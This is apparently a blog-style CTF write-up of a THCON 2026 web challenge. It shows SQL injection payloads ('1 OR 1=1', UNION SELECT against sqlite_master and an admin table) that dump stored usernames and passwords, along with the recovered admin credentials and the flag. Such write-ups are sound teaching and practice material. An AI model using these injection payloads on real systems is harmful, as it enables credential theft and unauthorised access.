---
layout: post
title:  "XSS_iN_tHe_Web (part 1/2)"
date:   2026-05-12 19:18:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /THCON-CTF-2026-XSS_iN_tHe_Web/
---

**Category**: Web

**Author**: Daresse (Thomas Hernandez)

**Description**: We found an exposed enpoint on the old XSS's server.

They used it to manage their agents database but it seems that we can't get any valuable information without admin access to the application...

[http://chal-8b764754.ctf.thcon.party](http://chal-8b764754.ctf.thcon.party)

I go to the site:

![Alt text](/images/thconweb3.png)

The site has a login page. When you query the database it makes the link something like this:
`http://chal-ee63f612.ctf.thcon.party/?id=1%20OR%201=1` (`1 OR 1=1`). 

Then once you visit `/view-result` it has this link as the referer:
```http
GET /view-result HTTP/1.1
Host: chal-ee63f612.ctf.thcon.party
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://chal-ee63f612.ctf.thcon.party/?id=http://chal-ee63f612.ctf.thcon.party/?id=1%20OR%201=1
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
This returns both users in the database and confirms SQLi. 

Next I visit `http://chal-ee63f612.ctf.thcon.party/?id=1 UNION SELECT sql,2 FROM sqlite_master --` and find there is a table called `adminDBtable`.

I dump usernames and passwords with: `http://chal-ee63f612.ctf.thcon.party/?id=1 UNION SELECT username, password FROM adminDBtable --`

Now I have credentials `admin:S_P3rSicreteP3asseworde%%`

Login to get the flag on the dashboard.

`THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}`